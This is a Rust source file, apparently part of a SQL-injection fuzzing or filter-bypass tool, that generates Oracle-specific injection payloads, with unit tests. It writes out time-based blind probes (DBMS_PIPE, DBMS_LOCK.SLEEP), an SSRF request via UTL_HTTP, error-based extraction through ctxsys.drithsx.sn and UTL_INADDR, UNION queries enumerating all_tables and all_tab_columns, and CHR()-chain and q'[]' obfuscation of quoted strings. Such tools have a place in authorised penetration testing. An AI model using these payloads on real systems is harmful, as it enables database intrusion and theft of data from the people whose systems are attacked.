//! Oracle-specific SQL grammar mutations.
//!
//! Oracle Database has unique bypass features:
//! - `DUAL` table requirement for `SELECT` without `FROM`
//! - `UTL_HTTP` / `UTL_INADDR` for SSRF/error-based exfiltration
//! - `DBMS_PIPE.RECEIVE_MESSAGE` for time-based blind
//! - `CHR()` function for character construction (not `CHAR()`)
//! - `||` concatenation operator
//! - `ctxsys.drithsx.sn` for error-based data extraction
//! - `CONNECT BY` / `START WITH` for recursive queries
//! - `XMLType()` for XML-based data extraction
//! - `q'[]'` alternative quoting syntax

/// Generate Oracle-specific mutations for a payload.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
    let mut results = Vec::new();
    let lower = payload.to_ascii_lowercase();

    // ── Time-based blind ──
    results.push("SELECT DBMS_PIPE.RECEIVE_MESSAGE('RDS',5) FROM DUAL".into());
    results.push("SELECT DBMS_LOCK.SLEEP(5) FROM DUAL".into());

    // ── SSRF via UTL_HTTP ──
    results.push("SELECT UTL_HTTP.REQUEST('http://127.0.0.1/') FROM DUAL".into());

    // ── Error-based extraction ──
    results.push("SELECT ctxsys.drithsx.sn(1,(SELECT user FROM DUAL)) FROM DUAL".into());
    // UTL_INADDR error-based — resolves hostname, errors with data in message
    results.push(
        "SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM DUAL)) FROM DUAL".into(),
    );

    // ── CHR() concatenation (Oracle uses ||) ──
    if lower.contains("char(") {
        results.push(payload.replace("CHAR(", "CHR("));
    }
    // Build string from CHR() chain
    if let Some(start) = payload.find('\'')
        && let Some(end) = payload[start + 1..].find('\'') {
            let inner = &payload[start + 1..start + 1 + end];
            if !inner.is_empty() && inner.len() <= 15 && results.len() < max_mutations {
                let chr_chain: String = inner
                    .chars()
                    .map(|c| format!("CHR({})", c as u32))
                    .collect::<Vec<_>>()
                    .join("||");
                results.push(format!(
                    "{}{}{}",
                    &payload[..start],
                    chr_chain,
                    &payload[start + 1 + end + 1..]
                ));
            }
        }

    // ── Alternative quoting syntax: q'[string]' ──
    if let Some(start) = payload.find('\'')
        && let Some(end) = payload[start + 1..].find('\'') {
            let inner = &payload[start + 1..start + 1 + end];
            if !inner.is_empty() && results.len() < max_mutations {
                results.push(format!(
                    "{}q'[{}]'{}",
                    &payload[..start],
                    inner,
                    &payload[start + 1 + end + 1..]
                ));
            }
        }

    // ── XMLType for data extraction ──
    if results.len() < max_mutations {
        results.push(
            "SELECT XMLType((SELECT user FROM DUAL)) FROM DUAL".into(),
        );
    }

    // ── CONNECT BY / START WITH for row generation ──
    if lower.contains("union") {
        results.push(format!("{payload} START WITH 1=1 CONNECT BY LEVEL<=1"));
    }

    // ── ROWNUM-based limiting ──
    if lower.contains("select") && !lower.contains("rownum") && results.len() < max_mutations {
        results.push(format!("{payload} AND ROWNUM=1"));
    }

    // ── ALL_TABLES schema enumeration ──
    if results.len() < max_mutations {
        let base = payload.trim_end_matches("--").trim_end_matches('#');
        results.push(format!(
            "{base} UNION SELECT table_name,NULL FROM all_tables--"
        ));
        results.push(format!(
            "{base} UNION SELECT column_name,NULL FROM all_tab_columns--"
        ));
    }

    // ── DECODE as alternative to CASE ──
    if results.len() < max_mutations {
        results.push(format!(
            "{} AND DECODE(1,1,1,0)=1--",
            payload.trim_end_matches("--").trim_end_matches('#')
        ));
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn oracle_time_based_generated() {
        let mutations = mutate("SELECT 1", 20);
        assert!(mutations.iter().any(|m| m.contains("DBMS_PIPE")));
    }

    #[test]
    fn dual_reference_exists() {
        let mutations = mutate("SELECT 1", 20);
        assert!(mutations.iter().any(|m| m.contains("FROM DUAL")));
    }

    #[test]
    fn chr_chain_generated() {
        let mutations = mutate("' OR 'admin'='admin'--", 20);
        assert!(mutations.iter().any(|m| m.contains("CHR(")));
    }

    #[test]
    fn alternative_quoting() {
        let mutations = mutate("' OR 'a'='a'--", 20);
        assert!(mutations.iter().any(|m| m.contains("q'[")));
    }

    #[test]
    fn xmltype_extraction() {
        let mutations = mutate("SELECT 1", 20);
        assert!(mutations.iter().any(|m| m.contains("XMLType")));
    }

    #[test]
    fn all_tables_enumeration() {
        let mutations = mutate("' OR 1=1--", 30);
        assert!(mutations.iter().any(|m| m.contains("all_tables")));
    }

    #[test]
    fn decode_alternative() {
        let mutations = mutate("' OR 1=1--", 30);
        assert!(mutations.iter().any(|m| m.contains("DECODE")));
    }

    #[test]
    fn utl_inaddr_error_based() {
        let mutations = mutate("SELECT 1", 20);
        assert!(mutations.iter().any(|m| m.contains("UTL_INADDR")));
    }
}
